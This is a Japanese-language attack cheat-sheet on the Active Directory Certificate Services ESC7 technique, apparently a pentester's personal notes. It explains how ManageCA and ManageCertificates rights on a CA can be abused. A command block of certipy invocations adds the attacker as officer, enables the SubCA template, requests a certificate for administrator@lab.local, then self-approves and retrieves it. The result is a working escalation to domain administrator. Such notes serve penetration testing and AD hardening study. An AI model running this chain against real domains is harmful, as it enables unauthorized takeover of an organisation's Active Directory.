---
title: ESC7（CA に対する ManageCA / ManageCertificates 権限の悪用）
date: 2026-10-17
category: Active Directory
topic: AD CS
tags: [active-directory, adcs, esc7, certipy]
summary: CA への管理権限があれば、危険フラグを自分で有効化したり、保留中の証明書要求を承認したりできる
---

## 概要

ESC7 は、CA（証明書発行局）に対する `ManageCA` や `ManageCertificates` の権限を持っている場合に成立する。`ManageCA` 権限があれば、CA の設定フラグ（ESC6 の `EDITF_ATTRIBUTESUBJECTALTNAME2` など）を自分で有効化できてしまう。また `ManageCertificates` 権限があれば、保留中（Pending）になっている証明書要求を承認できる。

つまり ESC7 は、CA の管理権限を悪用して ESC6 の状態を自作自演で作り出したり、本来は拒否されるはずの証明書要求を無理やり承認して発行まで持ち込んだりする手法。

## 手順

1. 対象 CA に対する `ManageCA` または `ManageCertificates` 権限を持っているか確認する。
2. `ManageCA` 権限があれば、自分を CA の管理者（officer）に追加して `ManageCertificates` 権限も得たうえで、`SubCA` テンプレートを有効にする。
3. `SubCA` テンプレートで、管理者の UPN を指定して証明書を要求する（拒否されて保留になる）。
4. `ManageCertificates` 権限で保留中の要求を承認し、証明書を取得する。

## コマンド

```
# ManageCA 権限で自分を officer に追加し、SubCA テンプレートを有効化
certipy ca -u user@lab.local -p 'Password123' -ca 'LAB-CA' -dc-ip <DC_IP> -add-officer user
certipy ca -u user@lab.local -p 'Password123' -ca 'LAB-CA' -dc-ip <DC_IP> -enable-template 'SubCA'
# SubCA で管理者の証明書を要求（拒否され、要求 ID が表示される）
certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' -target <CA_HOST> \
  -template 'SubCA' -upn administrator@lab.local
# 保留中の要求を承認して取得
certipy ca -u user@lab.local -p 'Password123' -ca 'LAB-CA' -dc-ip <DC_IP> -issue-request <REQUEST_ID>
certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' -target <CA_HOST> -retrieve <REQUEST_ID>
```

## 注意点

- BloodHound 等で、`ManageCA`/`ManageCertificates` を持つアカウントを探す。
- ESC6 のフラグが無効でも、`ManageCA` があれば自分でフラグを立てられる。
